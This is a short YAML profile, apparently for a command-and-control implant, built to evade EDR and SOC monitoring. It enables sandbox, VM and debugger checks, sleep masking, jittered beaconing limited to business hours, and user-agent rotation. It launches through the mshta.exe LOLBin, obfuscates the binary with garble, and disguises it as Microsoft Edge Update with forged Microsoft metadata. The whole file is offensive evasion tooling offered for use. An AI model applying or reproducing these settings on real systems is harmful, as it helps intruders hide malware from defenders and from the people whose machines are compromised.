# Paranoid profile — maximum OPSEC for EDR/SOC-monitored targets
# Beacon only during business hours to blend with legitimate traffic.
# Recommended shell timeout: --timeout 900
# Set kill_date to auto-wipe after engagement (format: 2006-01-02)
name: paranoid
sleep_interval: 600s
jitter_percent: 50
max_retries: 2
enable_sandbox_check: true
enable_vm_check: true
enable_debug_check: true
sleep_masking: true
user_agent_rotation: true
kill_date: ""
working_hours_only: true
working_hours_start: 9
working_hours_end: 17

# Level 1 evasion
exec_method: mshta          # spawn via mshta.exe LOLBin
obfuscate: true             # requires garble: go install mvdan.cc/garble@latest
masquerade:
  enabled: true
  company: "Microsoft Corporation"
  product: "Microsoft Edge"
  description: "Microsoft Edge Update"
  original_filename: "MicrosoftEdgeUpdate.exe"
  version: "1.3.187.37"
